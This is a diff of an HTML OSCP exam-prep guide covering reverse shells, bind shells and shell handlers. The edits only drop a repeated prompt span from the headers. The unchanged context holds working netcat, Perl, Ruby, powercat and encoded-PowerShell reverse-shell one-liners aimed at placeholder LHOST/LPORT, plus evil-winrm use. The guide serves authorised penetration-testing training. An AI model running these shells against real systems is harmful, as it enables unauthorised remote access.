@@ -119,7 +119,7 @@ Get-NetTCPConnection -State Listen
 <p>Windows:</p>
 <pre><code class="language-cmd">whoami &#x26; hostname &#x26; cd
 </code></pre>
-<p>For blind execution, use one bounded callback or file side effect that the current context can produce and you can independently observe. Do not interpret a hung HTTP request as proof of a shell; the server may simply be waiting on a child process or timeout.</p><details data-method-fold><summary><h2 id="linux-reverse-shell-baselines">9.4.2.6 Obtain a Linux shell through a supported reverse connection <span class="method-label">Linux reverse-shell baselines</span></h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+<p>For blind execution, use one bounded callback or file side effect that the current context can produce and you can independently observe. Do not interpret a hung HTTP request as proof of a shell; the server may simply be waiting on a child process or timeout.</p><details data-method-fold><summary><h2 id="linux-reverse-shell-baselines">9.4.2.6 Obtain a Linux shell through a supported reverse connection <span class="method-label">Linux reverse-shell baselines</span></h2></summary>
 <a id="s-9-4-2-6"></a>
 <p>Choose an interpreter that you confirmed exists.</p>
 <p>Bash TCP:</p>
@@ -147,7 +147,7 @@ cat /tmp/f | /bin/sh -i 2>&#x26;1 | nc LHOST LPORT >/tmp/f
 </details>
 <blockquote>
 <p><strong>Shell-language cue:</strong> a command injection may execute through <code>/bin/sh</code>, which does not understand every Bash construct. Wrap Bash-specific syntax in <code>bash -c '...'</code> and then encode it for the outer HTTP/template/database layer.</p>
-</blockquote></details><details data-method-fold><summary><h2 id="windows-session-options">9.4.2.7 Obtain a Windows command session through a supported channel <span class="method-label">Windows session options</span></h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+</blockquote></details><details data-method-fold><summary><h2 id="windows-session-options">9.4.2.7 Obtain a Windows command session through a supported channel <span class="method-label">Windows session options</span></h2></summary>
 <a id="s-9-4-2-7"></a>
 <p>Prefer an available authenticated service:</p>
 <pre><code class="language-bash">evil-winrm -i TARGET -u USER -p 'PASSWORD'
@@ -176,7 +176,7 @@ $encoded
 </code></pre>
 <p>Invoke in the target command context:</p>
 <pre><code class="language-cmd">powershell.exe -NoProfile -NonInteractive -EncodedCommand BASE64_UTF16LE
-</code></pre></details><details data-method-fold><summary><h2 id="bind-shells">9.4.2.8 Connect to a shell listening on the reachable target <span class="method-label">Bind shells</span></h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+</code></pre></details><details data-method-fold><summary><h2 id="bind-shells">9.4.2.8 Connect to a shell listening on the reachable target <span class="method-label">Bind shells</span></h2></summary>
 <a id="s-9-4-2-8"></a>
 <p>Use a bind shell only when Kali can reach a target listener and reverse egress is unavailable.</p>
 <p>Traditional Netcat with <code>-e</code> support on a Linux target:</p>
@@ -418,7 +418,7 @@ netstat -ano
 
 <table><thead><tr><th>Symptom</th><th>Interpretation / next action</th></tr></thead><tbody><tr><td>Direct command fails</td><td>Repair exploit/request/parser before payload work</td></tr><tr><td>Direct command succeeds, no SYN</td><td>Correct payload, LHOST, interpreter or egress</td></tr><tr><td>Listener absent/wrong bind</td><td>Bind before trigger and verify with <code>ss</code></td></tr><tr><td>Connection to raw listener, no I/O</td><td>Check staged payload or buffering</td></tr><tr><td>Immediate disconnect</td><td>Check process crash, handler/payload match and exit behavior</td></tr><tr><td>Shell lacks job control</td><td>Spawn PTY and repair local terminal state</td></tr><tr><td>Arrow keys/control characters break</td><td>Correct PTY, raw mode and <code>TERM</code></td></tr><tr><td>Windows shell output is garbled</td><td>Check code page/encoding and payload channel</td></tr><tr><td>File vanishes after transfer</td><td>Gather quarantine/security-control evidence</td></tr><tr><td>Works once, not again</td><td>Check single-use listener, service crash, cleanup and trigger state</td></tr></tbody></table>
 <a id="s-9-4-2-16"></a><h2 id="exam-boundary">9.4.2.16 Exam boundary</h2>
-<p>The current OSCP+ guide permits <code>msfvenom</code> and <code>exploit/multi/handler</code> against all targets, but Meterpreter and Metasploit Auxiliary/Exploit/Post modules become locked to one selected target. Metasploit pivoting is prohibited. AI chatbots are prohibited during the actual exam. Recheck the current guide before a mock or exam.</p><details data-method-fold><summary><h2 id="powercat--windows-powershell-shell-transport">9.4.2.17 Powercat — Windows PowerShell shell transport</h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+<p>The current OSCP+ guide permits <code>msfvenom</code> and <code>exploit/multi/handler</code> against all targets, but Meterpreter and Metasploit Auxiliary/Exploit/Post modules become locked to one selected target. Metasploit pivoting is prohibited. AI chatbots are prohibited during the actual exam. Recheck the current guide before a mock or exam.</p><details data-method-fold><summary><h2 id="powercat--windows-powershell-shell-transport">9.4.2.17 Powercat — Windows PowerShell shell transport</h2></summary>
 <a id="s-9-4-2-17"></a>
 <p>Use when a reviewed powercat.ps1 is available and the current PowerShell context permits it. Keep the listener and target connection direction explicit.</p>
 <pre><code class="language-bash"># Attacker: listener
@@ -429,7 +429,7 @@ nc -lvnp LPORT
 powercat -c LHOST -p LPORT -e cmd.exe
 </code></pre>
 <p>Read: a connection is not yet an identity proof; run hostname/whoami in the resulting channel. Script-policy/AV/runtime failures → use the existing native transfer and shell alternatives. Powercat does not repair a missing callback route.</p>
-<p>Sources: <a href="https://github.com/besimorhino/powercat">upstream 1</a>.</p></details><details data-method-fold><summary><h2 id="penelope-or-pwncat-cs--handle-an-existing-shell-and-move-files">9.4.2.18 Penelope or pwncat-cs — handle an existing shell and move files</h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+<p>Sources: <a href="https://github.com/besimorhino/powercat">upstream 1</a>.</p></details><details data-method-fold><summary><h2 id="penelope-or-pwncat-cs--handle-an-existing-shell-and-move-files">9.4.2.18 Penelope or pwncat-cs — handle an existing shell and move files</h2></summary>
 <a id="s-9-4-2-18"></a>
 <p>Choose one handler when its basic session/transfer features fit your platform. pwncat-cs assumes Linux unless configured otherwise; these are not interchangeable names for every similarly named pwncat project.</p>
 <h3 id="variant-9-4-2-18-1">9.4.2.18.1 Basic reverse-shell listener with pwncat-cs</h3><pre><code class="language-bash"># Basic reverse-shell listener with pwncat-cs
@@ -464,7 +464,7 @@ tmux capture-pane -p -S - -t oscp:0.0 > pane-history.txt
 <pre><code class="language-bash">curl -i http://TARGET:PORT/ACTUAL_PATH/probe.aspx
 </code></pre>
 <p>Read: the process identity, rather than literal source or a file download, verifies server-side handling. Then use the matching ASPX/Windows payload generation already covered here, with the correct runtime/architecture and return route. Delete the test artifact after validation.</p>
-<p>Sources: <a href="https://learn.microsoft.com/en-us/previous-versions/aspnet/k33801s3(v=vs.100)">upstream 1</a>.</p><details data-method-fold><summary><h2 id="shell-alternatives-when-the-installed-runtime-changes">9.4.2.21 Shell alternatives when the installed runtime changes</h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+<p>Sources: <a href="https://learn.microsoft.com/en-us/previous-versions/aspnet/k33801s3(v=vs.100)">upstream 1</a>.</p><details data-method-fold><summary><h2 id="shell-alternatives-when-the-installed-runtime-changes">9.4.2.21 Shell alternatives when the installed runtime changes</h2></summary>
 <a id="s-9-4-2-21"></a>
 <p>Choose one matching the actual target runtime and a reachable listener. These alternatives retain the current execution identity; they do not create privilege by themselves.</p>
 <h3 id="variant-9-4-2-21-1">9.4.2.21.1 Attacker</h3><pre><code class="language-bash"># Attacker
@@ -477,7 +477,7 @@ perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyn
 ruby -rsocket -e 's=TCPSocket.new("LHOST",LPORT);exec("/bin/sh","-i",in:s,out:s,err:s)'
 </code></pre>
 <p>Read: check hostname/id after connecting, then use the existing PTY stabilization steps. Missing runtime, unsupported BusyBox options or a blocked return path → choose a supported transport instead of repeatedly changing the shell command. A noninteractive process can execute correctly while lacking a terminal.</p>
-<p>Sources: <a href="https://busybox.net/downloads/BusyBox.html">upstream 1</a> · <a href="https://perldoc.perl.org/Socket">upstream 2</a> · <a href="https://docs.ruby-lang.org/en/master/Kernel.html#method-i-exec">upstream 3</a>.</p></details><details data-method-fold><summary><h2 id="openssl-transport-when-a-tls-callback-is-useful">9.4.2.22 OpenSSL transport when a TLS callback is useful</h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+<p>Sources: <a href="https://busybox.net/downloads/BusyBox.html">upstream 1</a> · <a href="https://perldoc.perl.org/Socket">upstream 2</a> · <a href="https://docs.ruby-lang.org/en/master/Kernel.html#method-i-exec">upstream 3</a>.</p></details><details data-method-fold><summary><h2 id="openssl-transport-when-a-tls-callback-is-useful">9.4.2.22 OpenSSL transport when a TLS callback is useful</h2></summary>
 <a id="s-9-4-2-22"></a>
 <p>Use when OpenSSL exists on both ends and the actual route permits the chosen listener. TLS is a transport choice, not a fix for an unreachable destination.</p>
 <h3 id="variant-9-4-2-22-1">9.4.2.22.1 Attacker: create a short-lived local test certificate, then listen</h3><pre><code class="language-bash"># Attacker: create a short-lived local test certificate, then listen
